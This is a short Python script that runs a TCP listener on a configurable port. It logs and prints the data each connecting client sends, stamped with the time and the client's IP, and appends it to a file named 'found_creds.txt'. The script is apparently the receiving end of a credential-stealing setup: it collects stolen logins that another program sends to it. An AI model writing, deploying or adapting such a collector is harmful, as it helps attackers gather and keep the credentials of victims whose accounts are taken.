import socket
from datetime import datetime, date
import sys

# Socket settings + connection to client =========
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('localhost',8900)) # CHANGE PORT AND ADDRESS !!! ==========
# listen(quantity of connections)
s.listen(1)
# get connections from socket = return socket descriptor
con, adr = s.accept()
print(f'Socket {adr} connected!')
# =========

# appearance things
data = 'Data to change and save!'
date_time = date.today().strftime("%B %d, %Y") ,datetime.now().strftime("%H:%M:%S")
header = f'(!!!) Time and data: {date_time} | IP {adr[0]}'
footer = '(*) End of data -'

try:
    while True:
        # get data
        # recv(max size of data)
        data = con.recv(1024).decode()

        # print data in real time ===
        print(header)
        print(data)
        print(footer)

        # save every piece of data
        with open('found_creds.txt','a') as file:
            file.write(f'{header}\n{data}\n{footer}\n\n')
            print('Data was saved!')

        # If client disconnects, it send's a lot of null data, so it'll save us from unnecessary logs
        if data == '':
            con.close()
            break

# in error situation, we have to immediately close connection
except Exception as err:
    con.close()
    raise sys.exit(f'Connection was closed because of error: {err}')
